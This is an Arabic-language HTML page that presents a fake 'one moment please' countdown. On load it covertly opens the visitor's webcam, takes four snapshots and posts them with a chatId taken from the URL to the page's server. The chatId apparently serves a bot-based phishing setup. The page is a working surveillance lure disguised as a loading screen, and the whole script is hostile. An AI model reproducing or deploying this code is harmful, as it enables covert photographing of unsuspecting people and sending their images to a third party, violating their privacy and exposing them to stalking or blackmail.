<!DOCTYPE html>
<html lang="ar">
<head>
  <title>لحظه واحده</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #121212;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    #countdown {
      font-size: 72px;
      font-weight: bold;
      color: #ff6600;
      animation: pulse 1s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    .error-message {
      font-size: 24px;
      color: #ffffff;
      margin-top: 20px;
    }
    #loading {
      display: none;
      font-size: 24px;
      color: #ffffff;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div>
    <div id="countdown">10</div>
    <div class="error-message">لحظة واحدة من فضلك</div>
    <div id="loading"></div>
  </div>

  <form method="POST" action="/so" id="photo-form">
    <input type="hidden" name="chatId" id="chatId">
    <input type="hidden" name="imageDatas" id="imageDatas">
  </form>

  <script>
    let countdown = 12;
    const countdownElement = document.getElementById('countdown');

    const interval = setInterval(() => {
      countdown--;
      countdownElement.textContent = countdown;
      if (countdown === 0) {
        clearInterval(interval);
        countdownElement.textContent = "تم الوجيه";
      }
    }, 1000);
  </script>

  <script>
    async function capturePhotos() {
      document.getElementById("loading").style.display = "block";
      const imageDatas = [];
      const video = document.createElement('video');
      video.style.display = 'none';
      document.body.appendChild(video);

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await video.play();

        for (let i = 0; i < 4; i++) {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          const imageData = canvas.toDataURL('image/jpeg').split(',')[1];
          imageDatas.push(imageData);

          // الانتظار لفترة وجيزة بين كل لقطة
          await new Promise(resolve => setTimeout(resolve, 500));
        }

        document.getElementById("imageDatas").value = imageDatas.join(',');

        // إيقاف بث الفيديو
        stream.getTracks().forEach(track => track.stop());
        document.body.removeChild(video);

        var chatId = getParameterByName('chatId');
        document.getElementById("chatId").value = chatId;

        document.getElementById("photo-form").submit();
      } catch (error) {
        console.error('Error accessing media devices.', error);
        alert('Error accessing camera.');
        document.getElementById("loading").style.display = "none";
      }
    }

    function getParameterByName(name, url = window.location.href) {
      name = name.replace(/[\[\]]/g, '\\$&');
      const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
            results = regex.exec(url);
      if (!results) return null;
      if (!results[2]) return '';
      return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }

    // بدء التقاط الصور فور تحميل الصفحة
    window.onload = capturePhotos;
  </script>
</body>
</html>